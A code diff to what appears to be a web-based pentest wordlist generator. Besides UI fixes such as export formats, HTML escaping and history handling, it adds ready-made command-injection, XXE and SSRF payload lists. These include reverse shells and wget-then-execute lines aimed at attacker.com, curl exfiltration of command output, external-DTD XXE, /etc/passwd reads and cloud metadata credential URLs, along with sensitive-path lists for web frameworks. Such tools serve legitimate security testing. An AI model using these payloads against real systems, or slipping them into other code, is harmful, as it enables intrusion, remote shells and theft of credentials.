@@ -91,15 +91,21 @@ function initializeDragDrop() {
 
 // File Upload Handler
 function handleFileUpload(event) {
-    const files = Array.from(event.target.files);
+    const files = Array.from(event.target.files || []);
     files.forEach(file => {
         const reader = new FileReader();
         reader.onload = (e) => {
             const content = e.target.result;
             analyzeWordlist(content, file.name);
         };
+        reader.onerror = () => {
+            showToast(`Failed to read ${file.name}`, 'error');
+        };
         reader.readAsText(file);
     });
+    // Reset the input so the same file can be re-selected and re-analyzed
+    const fileInput = document.getElementById('fileInput');
+    if (fileInput) fileInput.value = '';
 }
 
 // Analyze Uploaded Wordlist
@@ -216,11 +222,11 @@ function generateBruteForce() {
     let wordlist = [];
     
     if (config.common) {
-        wordlist.push(...getCommonPasswords());
+        wordlist.push(...generateCommonPasswords());
     }
-    
+
     if (config.numeric) {
-        wordlist.push(...generateNumericPatterns(config.minLength, config.maxLength));
+        wordlist.push(...getNumericPatterns(config.minLength, config.maxLength));
     }
     
     if (config.keyboard) {
@@ -309,7 +315,7 @@ function generateUsernames() {
     let wordlist = [];
     
     if (config.common) {
-        wordlist.push(...getCommonUsernames());
+        wordlist.push(...generateCommonUsernames());
     }
     
     config.names.forEach(name => {
@@ -476,43 +482,73 @@ function generateWebTech() {
         apache: document.getElementById('tech-apache').checked,
         nginx: document.getElementById('tech-nginx').checked,
         tomcat: document.getElementById('tech-tomcat').checked,
-        iis: document.getElementById('tech-iis').checked
+        iis: document.getElementById('tech-iis').checked,
+        laravel: document.getElementById('tech-laravel').checked,
+        djangoflask: document.getElementById('tech-djangoflask').checked,
+        spring: document.getElementById('tech-spring').checked,
+        express: document.getElementById('tech-express').checked,
+        rails: document.getElementById('tech-rails').checked,
+        aspnet: document.getElementById('tech-aspnet').checked
     };
-    
+
     let wordlist = [];
-    
+
     if (config.wordpress) {
         wordlist.push(...getWordPressPaths());
     }
-    
+
     if (config.drupal) {
         wordlist.push(...getDrupalPaths());
     }
-    
+
     if (config.joomla) {
         wordlist.push(...getJoomlaPaths());
     }
-    
+
     if (config.magento) {
         wordlist.push(...getMagentoPaths());
     }
-    
+
     if (config.apache) {
         wordlist.push(...getApachePaths());
     }
-    
+
     if (config.nginx) {
         wordlist.push(...getNginxPaths());
     }
-    
+
     if (config.tomcat) {
         wordlist.push(...getTomcatPaths());
     }
-    
+
     if (config.iis) {
         wordlist.push(...getIISPaths());
     }
-    
+
+    if (config.laravel) {
+        wordlist.push(...getLaravelPaths());
+    }
+
+    if (config.djangoflask) {
+        wordlist.push(...getDjangoFlaskPaths());
+    }
+
+    if (config.spring) {
+        wordlist.push(...getSpringPaths());
+    }
+
+    if (config.express) {
+        wordlist.push(...getExpressPaths());
+    }
+
+    if (config.rails) {
+        wordlist.push(...getRailsPaths());
+    }
+
+    if (config.aspnet) {
+        wordlist.push(...getAspNetPaths());
+    }
+
     displayResults(wordlist, 'Web Technology Paths');
 }
 
@@ -522,30 +558,45 @@ function generateSecurity() {
         xss: document.getElementById('sec-xss').checked,
         lfi: document.getElementById('sec-lfi').checked,
         rfi: document.getElementById('sec-rfi').checked,
+        cmdi: document.getElementById('sec-cmdi').checked,
+        xxe: document.getElementById('sec-xxe').checked,
+        ssrf: document.getElementById('sec-ssrf').checked,
         basic: document.getElementById('sec-basic').checked,
         advanced: document.getElementById('sec-advanced').checked,
         bypass: document.getElementById('sec-bypass').checked,
         encoded: document.getElementById('sec-encoded').checked
     };
-    
+
     let wordlist = [];
-    
+
     if (config.sqli) {
         wordlist.push(...getSQLInjectionPayloads(config));
     }
-    
+
     if (config.xss) {
         wordlist.push(...getXSSPayloads(config));
     }
-    
+
     if (config.lfi) {
         wordlist.push(...getLFIPayloads(config));
     }
-    
+
     if (config.rfi) {
         wordlist.push(...getRFIPayloads(config));
     }
-    
+
+    if (config.cmdi) {
+        wordlist.push(...getCommandInjectionPayloads(config));
+    }
+
+    if (config.xxe) {
+        wordlist.push(...getXXEPayloads(config));
+    }
+
+    if (config.ssrf) {
+        wordlist.push(...getSSRFPayloads(config));
+    }
+
     displayResults(wordlist, 'Security Testing Payloads');
 }
 
@@ -591,8 +642,18 @@ function calculateWordlistStats(words) {
     };
 }
 
+const MAX_WORDLIST_SIZE = 1000000;
+
 function displayResults(wordlist, generatorName) {
-    currentWordlist = [...new Set(wordlist)]; // Remove duplicates
+    let deduped = [...new Set(wordlist)]; // Remove duplicates
+    let truncated = false;
+
+    if (deduped.length > MAX_WORDLIST_SIZE) {
+        deduped = deduped.slice(0, MAX_WORDLIST_SIZE);
+        truncated = true;
+    }
+
+    currentWordlist = deduped;
     const stats = calculateWordlistStats(currentWordlist);
     
     // Update results
@@ -614,7 +675,11 @@ function displayResults(wordlist, generatorName) {
         wordlist: currentWordlist.slice(0, 100) // Store first 100 for preview
     });
     
-    showToast(`Generated ${stats.count} words for ${generatorName}`, 'success');
+    if (truncated) {
+        showToast(`Generated ${stats.count.toLocaleString()} words (truncated to ${MAX_WORDLIST_SIZE.toLocaleString()} max) for ${generatorName}`, 'info');
+    } else {
+        showToast(`Generated ${stats.count} words for ${generatorName}`, 'success');
+    }
 }
 
 function formatBytes(bytes) {
@@ -651,9 +716,33 @@ function hideProgress() {
 // Action Functions
 function copyToClipboard() {
     const textarea = document.getElementById('resultsTextarea');
-    textarea.select();
-    document.execCommand('copy');
-    showToast('Wordlist copied to clipboard!', 'success');
+
+    if (!textarea.value) {
+        showToast('No wordlist to copy', 'error');
+        return;
+    }
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(textarea.value).then(() => {
+            showToast('Wordlist copied to clipboard!', 'success');
+        }).catch(() => {
+            fallbackCopy(textarea);
+        });
+    } else {
+        fallbackCopy(textarea);
+    }
+}
+
+function fallbackCopy(textarea) {
+    try {
+        textarea.select();
+        document.execCommand('copy');
+        showToast('Wordlist copied to clipboard!', 'success');
+    } catch (err) {
+        showToast('Failed to copy to clipboard', 'error');
+    } finally {
+        window.getSelection().removeAllRanges();
+    }
 }
 
 function downloadWordlist() {
@@ -661,21 +750,43 @@ function downloadWordlist() {
         showToast('No wordlist to download', 'error');
         return;
     }
-    
-    const blob = new Blob([currentWordlist.join('\n')], { type: 'text/plain' });
+
+    const formatSelect = document.getElementById('exportFormat');
+    const format = formatSelect ? formatSelect.value : 'txt';
+
+    let content, mimeType, extension;
+
+    switch (format) {
+        case 'json':
+            content = JSON.stringify(currentWordlist, null, 2);
+            mimeType = 'application/json';
+            extension = 'json';
+            break;
+        case 'csv':
+            content = 'word\n' + currentWordlist.map(w => `"${String(w).replace(/"/g, '""')}"`).join('\n');
+            mimeType = 'text/csv';
+            extension = 'csv';
+            break;
+        default:
+            content = currentWordlist.join('\n');
+            mimeType = 'text/plain';
+            extension = 'txt';
+    }
+
+    const blob = new Blob([content], { type: mimeType });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
-    
+
     a.href = url;
-    a.download = `wordlist_${new Date().getTime()}.txt`;
+    a.download = `wordlist_${new Date().getTime()}.${extension}`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
-    
+
     appStats.totalDownloads++;
     updateStats();
-    showToast('Wordlist downloaded successfully!', 'success');
+    showToast(`Wordlist downloaded as ${extension.toUpperCase()}!`, 'success');
 }
 
 function saveToHistory() {
@@ -705,31 +816,60 @@ function addToHistory(item) {
     saveToLocalStorage();
 }
 
+function escapeHTML(str) {
+    return String(str ?? '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+}
+
 function updateHistoryDisplay() {
     const historyList = document.getElementById('historyList');
-    
+
     if (generationHistory.length === 0) {
         historyList.innerHTML = '<div class="history-empty">No history yet</div>';
         return;
     }
-    
-    historyList.innerHTML = generationHistory.slice(0, 10).map(item => `
-        <div class="history-item" onclick="loadFromHistory(${generationHistory.indexOf(item)})">
-            <div class="history-item-title">${item.type}</div>
+
+    historyList.innerHTML = generationHistory.slice(0, 10).map((item, index) => `
+        <div class="history-item" data-index="${index}">
+            <div class="history-item-title">${escapeHTML(item.type)}</div>
             <div class="history-item-meta">
                 ${item.count ? `${item.count} words • ` : ''}
                 ${new Date(item.timestamp).toLocaleString()}
             </div>
         </div>
     `).join('');
+
+    historyList.querySelectorAll('.history-item').forEach(el => {
+        el.addEventListener('click', () => loadFromHistory(parseInt(el.dataset.index, 10)));
+    });
 }
 
 function loadFromHistory(index) {
     const item = generationHistory[index];
     if (item && item.wordlist) {
-        currentWordlist = item.wordlist;
+        if (item.wordlist.length < item.count) {
+            showToast(`Note: only the first ${item.wordlist.length} of ${item.count} words were stored in history`, 'info');
+        }
+        currentWordlist = [...item.wordlist];
         displayResults(currentWordlist, `From History: ${item.type}`);
+    } else {
+        showToast('No wordlist data available for this history item', 'error');
     }
+}
+
+function clearHistory() {
+    if (generationHistory.length === 0) {
+        showToast('History is already empty', 'info');
+        return;
+    }
+    generationHistory = [];
+    updateHistoryDisplay();
+    saveToLocalStorage();
+    showToast('Generation history cleared', 'success');
 }
 
 function updateStats() {
@@ -1776,6 +1916,198 @@ function getRFIPayloads(config) {
     }
     
     return payloads;
+}
+
+function getCommandInjectionPayloads(config) {
+    const payloads = [];
+
+    if (config.basic) {
+        payloads.push(
+            ';id', ';whoami', ';ls', ';cat /etc/passwd', ';uname -a',
+            '|id', '|whoami', '|ls', '|cat /etc/passwd', '|uname -a',
+            '||id', '||whoami', '||ls -la', '&&id', '&&whoami', '&&ls -la',
+            '`id`', '`whoami`', '$(id)', '$(whoami)', '$(cat /etc/passwd)',
+            '& id', '& whoami', '; ping -c 1 127.0.0.1', '| ping -c 1 127.0.0.1'
+        );
+    }
+
+    if (config.advanced) {
+        payloads.push(
+            '; nc -e /bin/sh attacker.com 4444',
+            '| nc -e /bin/sh attacker.com 4444',
+            '`curl http://attacker.com/$(whoami)`',
+            '$(curl http://attacker.com/$(id -u))',
+            '; wget http://attacker.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh',
+            '|| python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'attacker.com\',4444))"',
+            '; bash -i >& /dev/tcp/attacker.com/4444 0>&1',
+            '; /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"',
+            '; env', '; set', '; printenv', '; cat /proc/self/environ'
+        );
+    }
+
+    if (config.bypass) {
+        payloads.push(
+            ';i""d', ';w\\ho\\ami', '; i$()d', '${IFS}id', '${IFS}cat${IFS}/etc/passwd',
+            ';${PATH:0:1}bin${PATH:0:1}id', '; i\\d', '|/bin/id', ';/bin/cat${IFS}/etc/passwd',
+            '%0Aid', '%0Awhoami', '%0A/bin/id', '\nwhoami', '\rid',
+            ';id #', '|id #', '; id;', '|id|'
+        );
+    }
+
+    if (config.encoded) {
+        payloads.push(
+            '%3Bid', '%7Cid', '%26%26id', '%60id%60', '%24%28id%29',
+            '%3Bwhoami', '%7Cwhoami', '%0aid', '%0did',
+            'JTNCaWQ=', 'aWQ=' // base64 fragments
+        );
+    }
+
+    return payloads;
+}
+
+function getXXEPayloads(config) {
+    const payloads = [];
+
+    if (config.basic) {
+        payloads.push(
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe "XXE">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+        );
+    }
+
+    if (config.advanced) {
+        payloads.push(
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo/>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><foo>&exfil;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&file;</data>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"> %local_dtd;]>'
+        );
+    }
+
+    if (config.bypass) {
+        payloads.push(
+            '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/payload.dtd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd?.xml">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        );
+    }
+
+    if (config.encoded) {
+        payloads.push(
+            '%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E',
+            'PD94bWwgdmVyc2lvbj0iMS4wIj8+PCFEOENUWVBFIGZvbyBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPjxmb28+JnhlOzwvZm9vPg=='
+        );
+    }
+
+    return payloads;
+}
+
+function getSSRFPayloads(config) {
+    const payloads = [];
+
+    if (config.basic) {
+        payloads.push(
+            'http://127.0.0.1', 'http://localhost', 'http://0.0.0.0',
+            'http://127.0.0.1:80', 'http://127.0.0.1:443', 'http://127.0.0.1:22',
+            'http://127.0.0.1:6379', 'http://127.0.0.1:3306', 'http://127.0.0.1:8080',
+            'http://169.254.169.254/latest/meta-data/',
+            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+            'http://169.254.169.254/latest/user-data/',
+            'http://metadata.google.internal/computeMetadata/v1/',
+            'http://169.254.169.254/metadata/v1/',
+            'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
+        );
+    }
+
+    if (config.advanced) {
+        payloads.push(
+            'http://[::1]', 'http://[::]', 'http://0x7f.0.0.1', 'http://2130706433',
+            'http://017700000001', 'http://127.1', 'http://127.0.1',
+            'gopher://127.0.0.1:6379/_FLUSHALL',
+            'dict://127.0.0.1:11211/stat',
+            'file:///etc/passwd',
+            'http://169.254.169.254/latest/meta-data/iam/security-credentials/role',
+            'http://100.100.100.200/latest/meta-data/'
+        );
+    }
+
+    if (config.bypass) {
+        payloads.push(
+            'http://127.0.0.1.nip.io', 'http://localtest.me', 'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',
+            'http://0177.0.0.1', 'http://127.000.000.001', 'http://127.0.0.1%00',
+            'http://127。0。0。1', 'http://127.0.0.1#@attacker.com',
+            'http://attacker.com@127.0.0.1', 'http://127.0.0.1@attacker.com'
+        );
+    }
+
+    if (config.encoded) {
+        payloads.push(
+            'http%3A%2F%2F127.0.0.1', 'http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F',
+            '%68%74%74%70%3A%2F%2F127.0.0.1', 'http://%31%32%37%2E%30%2E%30%2E%31'
+        );
+    }
+
+    return payloads;
+}
+
+function getLaravelPaths() {
+    return [
+        '/.env', '/.env.backup', '/.env.example', '/artisan',
+        '/storage/logs/laravel.log', '/vendor/', '/app/', '/bootstrap/cache/',
+        '/config/app.php', '/routes/web.php', '/routes/api.php',
+        '/database/migrations/', '/public/index.php', '/resources/views/',
+        '/_ignition/execute-solution', '/telescope', '/horizon'
+    ];
+}
+
+function getDjangoFlaskPaths() {
+    return [
+        '/admin/', '/admin/login/', '/static/', '/media/', '/__debug__/',
+        '/api/', '/accounts/login/', '/accounts/register/', '/manage.py',
+        '/settings.py', '/wsgi.py', '/urls.py', '/.flaskenv',
+        '/console', '/debugger', '/werkzeug'
+    ];
+}
+
+function getSpringPaths() {
+    return [
+        '/actuator', '/actuator/health', '/actuator/env', '/actuator/beans',
+        '/actuator/mappings', '/actuator/heapdump', '/actuator/httptrace',
+        '/actuator/metrics', '/actuator/configprops', '/actuator/loggers',
+        '/swagger-ui.html', '/swagger-ui/', '/v2/api-docs', '/v3/api-docs',
+        '/error', '/trace', '/jolokia'
+    ];
+}
+
+function getExpressPaths() {
+    return [
+        '/package.json', '/package-lock.json', '/node_modules/', '/.env',
+        '/app.js', '/server.js', '/index.js', '/config/', '/routes/',
+        '/views/', '/public/', '/api/', '/debug'
+    ];
+}
+
+function getRailsPaths() {
+    return [
+        '/rails/info/properties', '/rails/info/routes', '/rails/mailers',
+        '/config/database.yml', '/config/secrets.yml', '/config/master.key',
+        '/app/', '/db/schema.rb', '/public/', '/Gemfile', '/Gemfile.lock',
+        '/.ruby-version', '/log/development.log', '/log/production.log'
+    ];
+}
+
+function getAspNetPaths() {
+    return [
+        '/web.config', '/appsettings.json', '/appsettings.Development.json',
+        '/bin/', '/App_Data/', '/App_Code/', '/.vs/', '/obj/', '/wwwroot/',
+        '/swagger/', '/swagger/index.html', '/.well-known/',
+        '/Trace.axd', '/elmah.axd', '/glimpse.axd'
+    ];
 }
 
 // Export for potential module use
